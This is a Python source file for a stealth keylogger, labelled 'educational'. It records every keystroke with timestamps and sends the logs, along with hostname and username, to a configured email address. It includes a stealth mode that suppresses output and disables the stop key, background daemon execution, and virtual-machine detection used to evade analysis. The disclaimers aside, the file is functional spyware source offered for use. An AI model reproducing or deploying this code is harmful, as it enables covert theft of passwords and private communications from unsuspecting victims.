"""
Educational keylogger implementation using pynput.
Captures keystrokes and integrates with email functionality.

Author: Educational Cybersecurity Project
Warning: For educational use only in controlled environments.
"""

import os
import sys
import time
import json
import threading
import logging
from datetime import datetime
from pynput import keyboard
from pynput.keyboard import Key
import platform
import subprocess

# Import local modules
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from logger.mailer import StegoMailer

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)


class StegoKeylogger:
    """
    Educational keylogger that captures keystrokes and sends them via email.
    Designed for cybersecurity learning in controlled environments.
    """
    
    def __init__(self, config_path="config.json"):
        """
        Initialize the keylogger with configuration.
        
        Args:
            config_path (str): Path to configuration file
        """
        self.config = self._load_config(config_path)
        self.keylog_buffer = []
        self.is_running = False
        self.listener = None
        self.mailer = None
        self.last_send_time = time.time()
        self.send_interval = self.config.get("keylogger", {}).get("send_interval", 300)  # 5 minutes
        self.max_log_size = self.config.get("keylogger", {}).get("max_log_size", 1024)
        self.stealth_mode = self.config.get("keylogger", {}).get("stealth_mode", True)
        
        # Initialize mailer
        try:
            self.mailer = StegoMailer(config_path)
        except Exception as e:
            logger.error(f"Failed to initialize mailer: {e}")
    
    def _load_config(self, config_path):
        """
        Load configuration from file.
        
        Args:
            config_path (str): Path to config file
            
        Returns:
            dict: Configuration dictionary
        """
        try:
            if os.path.exists(config_path):
                with open(config_path, 'r') as f:
                    return json.load(f)
            else:
                logger.warning(f"Config file not found: {config_path}")
                return {}
        except Exception as e:
            logger.error(f"Failed to load config: {e}")
            return {}
    
    def get_system_info(self):
        """
        Collect system information for logging purposes.
        
        Returns:
            dict: System information
        """
        try:
            info = {
                "Platform": platform.system(),
                "Release": platform.release(),
                "Version": platform.version(),
                "Machine": platform.machine(),
                "Processor": platform.processor(),
                "Hostname": platform.node(),
                "Python Version": platform.python_version(),
                "Timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            }
            
            # Add user information (educational purposes)
            try:
                info["User"] = os.getlogin()
            except:
                info["User"] = os.environ.get("USERNAME", "Unknown")
            
            # Add current working directory
            info["Working Directory"] = os.getcwd()
            
            return info
            
        except Exception as e:
            logger.error(f"Failed to collect system info: {e}")
            return {"Error": "System info collection failed"}
    
    def format_key(self, key):
        """
        Format captured key for logging.
        
        Args:
            key: Captured key object
            
        Returns:
            str: Formatted key string
        """
        try:
            # Handle special keys
            if key == Key.space:
                return " "
            elif key == Key.enter:
                return "\n"
            elif key == Key.tab:
                return "\t"
            elif key == Key.backspace:
                return "[BACKSPACE]"
            elif key == Key.delete:
                return "[DELETE]"
            elif key == Key.shift or key == Key.shift_l or key == Key.shift_r:
                return "[SHIFT]"
            elif key == Key.ctrl or key == Key.ctrl_l or key == Key.ctrl_r:
                return "[CTRL]"
            elif key == Key.alt or key == Key.alt_l or key == Key.alt_r:
                return "[ALT]"
            elif key == Key.esc:
                return "[ESC]"
            elif hasattr(key, 'char') and key.char:
                return key.char
            else:
                return f"[{str(key).upper()}]"
                
        except Exception as e:
            logger.error(f"Key formatting error: {e}")
            return "[UNKNOWN]"
    
    def on_press(self, key):
        """
        Handle key press events.
        
        Args:
            key: Pressed key object
        """
        try:
            formatted_key = self.format_key(key)
            timestamp = datetime.now().strftime("%H:%M:%S")
            
            # Add to buffer with timestamp
            self.keylog_buffer.append(f"[{timestamp}] {formatted_key}")
            
            # Check if we need to send logs
            current_time = time.time()
            buffer_size = len(''.join(self.keylog_buffer))
            
            if (current_time - self.last_send_time >= self.send_interval or 
                buffer_size >= self.max_log_size):
                self.send_logs()
            
            # Educational purpose: Show captured key (remove for stealth)
            if not self.stealth_mode:
                logger.info(f"Key captured: {formatted_key}")
                
        except Exception as e:
            logger.error(f"Error in key press handler: {e}")
    
    def send_logs(self):
        """
        Send accumulated logs via email.
        """
        try:
            if not self.keylog_buffer:
                return
            
            if not self.mailer:
                logger.error("Mailer not initialized")
                return
            
            # Prepare log data
            log_data = ''.join(self.keylog_buffer)
            system_info = self.get_system_info()
            
            # Send email
            success = self.mailer.send_log(log_data, system_info)
            
            if success:
                logger.info(f"Sent {len(self.keylog_buffer)} keylog entries")
                self.keylog_buffer.clear()
                self.last_send_time = time.time()
            else:
                logger.error("Failed to send keylog data")
                # Keep buffer for retry (implement retry logic if needed)
                
        except Exception as e:
            logger.error(f"Error sending logs: {e}")
    
    def on_release(self, key):
        """
        Handle key release events.
        
        Args:
            key: Released key object
        """
        # Stop keylogger on ESC key (for testing/educational purposes)
        if key == Key.esc and not self.stealth_mode:
            logger.info("ESC pressed - stopping keylogger")
            return False
    
    def start_logging(self, duration=None):
        """
        Start the keylogger.
        
        Args:
            duration (int): Optional duration in seconds to run
        """
        try:
            logger.info("Starting keylogger...")
            
            if self.stealth_mode:
                logger.info("Running in stealth mode")
            
            self.is_running = True
            
            # Start keyboard listener
            self.listener = keyboard.Listener(
                on_press=self.on_press,
                on_release=self.on_release
            )
            
            self.listener.start()
            
            # Run for specified duration or indefinitely
            if duration:
                logger.info(f"Running for {duration} seconds")
                time.sleep(duration)
                self.stop_logging()
            else:
                logger.info("Running indefinitely (press ESC to stop in non-stealth mode)")
                self.listener.join()
                
        except Exception as e:
            logger.error(f"Error starting keylogger: {e}")
            self.is_running = False
    
    def stop_logging(self):
        """
        Stop the keylogger and send remaining logs.
        """
        try:
            logger.info("Stopping keylogger...")
            self.is_running = False
            
            if self.listener:
                self.listener.stop()
            
            # Send any remaining logs
            if self.keylog_buffer:
                self.send_logs()
            
            # Cleanup mailer connection
            if self.mailer:
                self.mailer.disconnect_smtp()
            
            logger.info("Keylogger stopped")
            
        except Exception as e:
            logger.error(f"Error stopping keylogger: {e}")
    
    def run_background(self, duration=None):
        """
        Run keylogger in background thread.
        
        Args:
            duration (int): Optional duration in seconds
        """
        try:
            thread = threading.Thread(
                target=self.start_logging,
                args=(duration,),
                daemon=True
            )
            thread.start()
            logger.info("Keylogger started in background")
            return thread
            
        except Exception as e:
            logger.error(f"Error starting background keylogger: {e}")
            return None
    
    def check_vm_environment(self):
        """
        Educational VM detection - check if running in virtual environment.
        
        Returns:
            bool: True if VM detected
        """
        try:
            vm_indicators = [
                "VMware", "VirtualBox", "QEMU", "Xen", "Parallels",
                "Microsoft Corporation"  # Hyper-V
            ]
            
            # Check system manufacturer
            try:
                result = subprocess.check_output(
                    ["wmic", "computersystem", "get", "manufacturer"],
                    shell=True, text=True
                )
                for indicator in vm_indicators:
                    if indicator.lower() in result.lower():
                        return True
            except:
                pass
            
            # Check for VM-specific files (Linux)
            vm_files = [
                "/proc/xen", "/proc/vz", "/sys/bus/acpi/devices/VBOX0000",
                "/sys/bus/acpi/devices/VMWARE0000"
            ]
            
            for vm_file in vm_files:
                if os.path.exists(vm_file):
                    return True
            
            return False
            
        except Exception as e:
            logger.error(f"VM detection error: {e}")
            return False


def create_test_keylogger():
    """
    Create a test keylogger for demonstration.
    """
    test_config = {
        "keylogger": {
            "send_interval": 10,  # 10 seconds for testing
            "max_log_size": 100,
            "stealth_mode": False
        },
        "email": {
            "smtp_server": "smtp.gmail.com",
            "smtp_port": 587,
            "username": "test@example.com",
            "password": "test_password",
            "target_email": "target@example.com",
            "subject": "Test Keylog Report"
        }
    }
    
    # Save test config
    with open("test_config.json", "w") as f:
        json.dump(test_config, f, indent=4)
    
    return StegoKeylogger("test_config.json")


def demo_keylogger():
    """
    Demonstration function for educational purposes.
    """
    print("=== StegoKeylogger Demo ===")
    print("This is an educational demonstration.")
    print("For learning purposes only!")
    
    # Create test keylogger
    keylogger = create_test_keylogger()
    
    # Show system info
    print("\nSystem Information:")
    system_info = keylogger.get_system_info()
    for key, value in system_info.items():
        print(f"  {key}: {value}")
    
    # Check VM environment
    is_vm = keylogger.check_vm_environment()
    print(f"\nVM Environment Detected: {is_vm}")
    
    print("\nKeylogger created successfully!")
    print("Note: Configure email settings to test functionality.")


if __name__ == "__main__":
    demo_keylogger()